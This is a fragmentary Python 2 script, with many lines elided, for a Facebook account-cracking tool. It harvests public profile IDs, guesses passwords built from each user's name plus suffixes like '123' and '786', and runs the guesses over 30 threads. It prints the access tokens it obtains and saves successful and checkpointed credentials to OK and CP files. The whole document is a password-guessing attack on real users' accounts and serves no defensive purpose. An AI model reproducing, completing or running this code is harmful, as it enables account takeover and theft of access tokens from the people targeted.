...
def login():
    ...
    try:
        ...
        if token == '':
            ...
            if token == 'help':
                os.system('xdg-open https://www.facebook.com/100065434664869/posts/307826904741796/?app=fbl')
...
def menu():
    ...
    logo()
    print ' [ ASALAM O ALAIKUM \x1b[0;93m%s\x1b[0;97m ]\n' % nama
    print ' [1] CRACK FROM PUBLIC ID'
    print ' [2] CRACK FROM PUBLIC FOLLOWER ID'
    print ' [3] CRACK MULTI PUBLIC IDS (\x1b[1;91mMAX 10\x1b[1;97m)'
    print ' [4] SEE RESULT'
...
def method():
    ...
    print ' [2] FREE FACEBOOK (Slow Crack)]'
            ...
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                ...
                for user in id:
                    ...
                    if len(name) >= 6:
                        ...
                        pwx = [name + '123', name + '1234', name + '786']
                    else:
                        pwx = [
                         name + '123', name + '1234', name + '786']
...
def api(uid, pwx):
    ...
    for pw in pwx:
        ...
        if 'session_key' in send.text and 'EAAA' in send.text:
            print '\r  \x1b[0;92m* [ALI/OK] %s|%s|%s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s|%s' % (uid, pw))
            open('OK/%s.txt' % tanggal, 'a').write('  [ALI/OK] %s|%s\n' % (uid, pw))
            break
            ...
            try:
                ...
                with requests.Session() as (ses):
                    ...
                    open('CP/%s.txt' % tanggal, 'a').write('  *[ALI/CP] %s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
